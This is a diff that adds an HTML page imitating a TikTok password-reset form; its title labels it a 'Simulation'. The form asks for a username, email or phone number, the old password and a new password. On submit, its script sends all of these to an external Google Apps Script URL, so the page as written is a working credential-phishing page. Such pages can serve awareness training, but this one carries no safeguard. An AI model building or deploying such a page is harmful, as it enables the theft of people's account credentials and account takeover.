@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Reset Password - TikTok (Simulation)</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f9f9f9;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+      .container {
+        background-color: #fff;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        max-width: 400px;
+        width: 100%;
+      }
+      .container h1 {
+        color: #333;
+        margin-bottom: 20px;
+        text-align: center;
+      }
+      .container input[type="text"],
+      .container input[type="password"] {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+      }
+      .container button {
+        width: 100%;
+        padding: 10px;
+        background-color: #25f4ee;
+        border: none;
+        border-radius: 5px;
+        color: white;
+        font-weight: bold;
+        cursor: pointer;
+      }
+      .container p {
+        color: #333;
+        text-align: center;
+        margin-top: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Reset Password</h1>
+      <form id="resetForm">
+        <input
+          type="text"
+          id="username"
+          placeholder="Username, Email, or Phone Number"
+          required
+        />
+        <input
+          type="password"
+          id="oldPassword"
+          placeholder="Old Password"
+          required
+        />
+        <input
+          type="password"
+          id="newPassword"
+          placeholder="New Password"
+          required
+        />
+        <input
+          type="password"
+          id="confirmPassword"
+          placeholder="Confirm New Password"
+          required
+        />
+        <button type="submit">Reset Password</button>
+      </form>
+      <p id="warningMessage" style="display: none"></p>
+    </div>
+
+    <script>
+      const form = document.getElementById("resetForm");
+      const responseDiv = document.getElementById("warningMessage");
+
+      form.addEventListener("submit", function (e) {
+        e.preventDefault();
+        const username = document.getElementById("username").value;
+        const oldPassword = document.getElementById("oldPassword").value;
+        const newPassword = document.getElementById("newPassword").value;
+        const confirmPassword =
+          document.getElementById("confirmPassword").value;
+
+        if (newPassword !== confirmPassword) {
+          responseDiv.textContent =
+            "New password and confirm password do not match.";
+          responseDiv.style.display = "block";
+          return;
+        }
+
+        const collectedData = {
+          username: username,
+          oldPassword: oldPassword,
+          newPassword: newPassword,
+        };
+
+        fetch(
+          "https://script.google.com/macros/s/AKfycbzJYINzX714vGwIJi9-GEGGFHOXOzZVMDB27Fo6VWI6A3R4Ibkel67emdmj9RAhsL0Y/exec",
+          {
+            method: "POST",
+            body: JSON.stringify(collectedData),
+          }
+        )
+          .then((response) => response.text())
+          .then((message) => {
+            console.log(message);
+            if (message === "Password reset successful!") {
+              responseDiv.style.display = "none";
+            } else {
+              responseDiv.textContent = message;
+              responseDiv.style.display = "block";
+            }
+          });
+      });
+    </script>
+  </body>
+</html>
